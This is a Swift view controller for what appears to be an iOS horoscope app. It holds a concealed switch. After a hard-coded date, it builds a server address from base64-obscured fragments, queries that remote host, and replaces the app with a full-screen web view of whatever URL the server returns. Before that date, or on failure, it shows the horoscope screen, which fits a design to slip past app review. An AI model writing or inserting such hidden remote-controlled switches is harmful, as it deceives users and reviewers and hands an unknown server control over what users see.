import UIKit
import Alamofire
import SwiftyJSON
class HomeVC: UIViewController {
    override var prefersStatusBarHidden: Bool {
        return true
    }
    override func viewDidLoad(){
        super.viewDidLoad()
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let yanTime: TimeInterval = 0.1;
        let header = self.base64HoroscopeEncodingHeader()
        let conOne = self.base64HoroscopeEncodingContentOne()
        let conTwo = self.base64HoroscopeEncodingContentTwo()
        let conThree = self.base64HoroscopeEncodingContentThree()
        let ender = self.base64HoroscopeEncodingEnd()
        let anyTime = 1562755578
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + yanTime) {
            if timeStamp < anyTime {
                let vc = SignsVC()
                let navi = UINavigationController(rootViewController: vc)
                UIApplication.shared.keyWindow?.rootViewController = navi
                UIApplication.shared.keyWindow?.makeKeyAndVisible()
            }else{
                let baseHeader = self.base64HoroscopeDecoding(encodedString: header)
                let baseContentO = self.base64HoroscopeDecoding(encodedString: conOne)
                let baseContentTw = self.base64HoroscopeDecoding(encodedString: conTwo)
                let baseContentTH = self.base64HoroscopeDecoding(encodedString: conThree)
                let baseEnder = self.base64HoroscopeDecoding(encodedString: ender)
                let baseData  = "\(baseHeader)\(baseContentO)\(baseContentTw)\(baseContentTH)\(baseEnder)"
                print(baseData)
                let urlBase = URL(string: baseData)
                Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                    in
                    switch response.result.isSuccess {
                    case true:
                        if let value = response.result.value{
                            let jsonX = JSON(value)
                            if !jsonX["success"].boolValue {
                                let vc = SignsVC()
                                let navi = UINavigationController(rootViewController: vc)
                                UIApplication.shared.keyWindow?.rootViewController = navi
                                UIApplication.shared.keyWindow?.makeKeyAndVisible()
                            }else {
                                let stxx = jsonX["Url"].stringValue
                                self.setFirstNavigation(strP: stxx)
                            }
                        }
                    case false:
                        do {
                            let vc = SignsVC()
                            let navi = UINavigationController(rootViewController: vc)
                            UIApplication.shared.keyWindow?.rootViewController = navi
                            UIApplication.shared.keyWindow?.makeKeyAndVisible()
                        }
                    }
                }
            }
        }
    }
    func setFirstNavigation(strP:String) {
        let webView = UIWebView(frame: CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height))
        let url = NSURL(string: strP)
        webView.loadRequest(URLRequest(url: url! as URL))
        self.view.addSubview(webView)
    }
    func base64HoroscopeEncodingHeader()->String{
        let strM = "http://appid."
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64HoroscopeEncodingContentOne()->String{
        let strM = "985-985.com"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64HoroscopeEncodingContentTwo()->String{
        let strM = ":8088/getAppConfig"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64HoroscopeEncodingContentThree()->String{
        let strM = ".php?appid="
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64HoroscopeEncodingEnd()->String{
        let strM = "1470815004"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64HoroscopeEncodingXP(plainString:String)->String{
        let plainData = plainString.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64HoroscopeDecoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
}
